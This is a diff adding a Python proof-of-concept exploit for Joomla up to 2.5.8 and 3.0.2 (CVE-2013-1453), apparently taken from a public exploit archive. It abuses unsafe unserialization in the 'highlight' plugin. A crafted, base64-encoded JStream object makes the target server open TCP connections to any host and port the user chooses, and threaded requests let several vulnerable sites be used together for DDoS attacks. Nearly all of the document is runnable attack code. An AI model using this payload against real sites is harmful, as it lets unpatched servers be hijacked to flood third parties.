@@ -1,0 +1,67 @@
+id: 20434
+date: 02/25/2013
+title: Joomla <=2.5.8,<=3.0.2 remote tcp connections opener
+author: redeemer
+cves: CVE-2013-1453
+
+#!/usr/bin/python
+#
+# Joomla <=2.5.8, <=3.0.2 remote tcp connections opener
+#
+# Vendor homepage: www.joomla.org                               ,'
+# Versions affected: <=2.5.8, <=3.0.2                                ,'        
+# Created: 2012-12-08                                 .,.        ,'
+# Public disclosure: 2013-02-04                     .`.`.`.  ,'       ,'
+# CVE: CVE-2013-1453                               .`.`.`.`.   ,'  ,'
+#                                                  .`.`.`.`.
+# Joomla core plugin 'highlight' unserializes      .`.`.`.`.  ,'     ,'
+# not trusted input. Plugin is enabled by           \\`.`.`.      ,'
+# default in standard joomla installation.           /\.,.   ,'     ,'
+#                                                   /
+# This proof of concept exploit uses JStream        :
+# joomla class to make target opens remote tcp      :
+# connections to custom address, therefore         /
+# multiple vulnerable joomla instances can be     "
+# used for ddos attacks.
+#
+# (JStream class can also be used to execute chmod on any file with any mode)
+#
+# Author: Marcin "redeemer" Probola
+#
+import threading
+import datetime
+import base64
+import httplib
+from optparse import OptionParser
+
+parser = OptionParser()
+parser.add_option("-H","--host",dest="host", help="Host with vulnerable joomla instance", default="localhost")
+parser.add_option("-C","--connect",dest="connectHost", help="Make connection to (in format HOST:PORT)", default="localhost:80")
+parser.add_option("-T","--threads",dest="threads", help="number of threads", default=1)
+(options, args) = parser.parse_args()
+
+# vars
+host = options.host
+connectHost = options.connectHost
+threads = int(options.threads)
+
+# prepare serialized content
+serializedTemplate = 'O:7:"JStream":14:{s:11:"\0*\0filemode";i:438;s:10:"\0*\0dirmode";i:493;s:12:"\0*\0chunksize";i:8192;s:11:"\0*\0filename";s:%d:"%s";s:14:"\0*\0writeprefix";s:0:"";s:13:"\0*\0readprefix";s:0:"";s:19:"\0*\0processingmethod";s:1:"f";s:10:"\0*\0filters";a:0:{}s:6:"\0*\0_fh";s:1:"1";s:12:"\0*\0_filesize";N;s:11:"\0*\0_context";N;s:18:"\0*\0_contextOptions";a:0:{}s:12:"\0*\0_openmode";s:1:"w";s:10:"\0*\0_errors";a:0:{}}'
+ftpConnectUrl = "ftp://u:p@" + connectHost + "/s"
+serializedBase64 = base64.b64encode( serializedTemplate % ( ftpConnectUrl.__len__(), ftpConnectUrl) )
+
+# thread class - blow (make http request)
+class ThreadClass(threading.Thread):
+	def run(self):
+		conn = httplib.HTTPConnection(host)
+		conn.connect()
+		conn.request("GET", "/?highlight="+serializedBase64)
+
+print host + " connect(" +str(threads)+") to " + connectHost + "\n"
+
+# run threads
+for i in range(threads):
+	t = ThreadClass()
+	t.start()
+
+#  0day.today [2023-03-22]  #
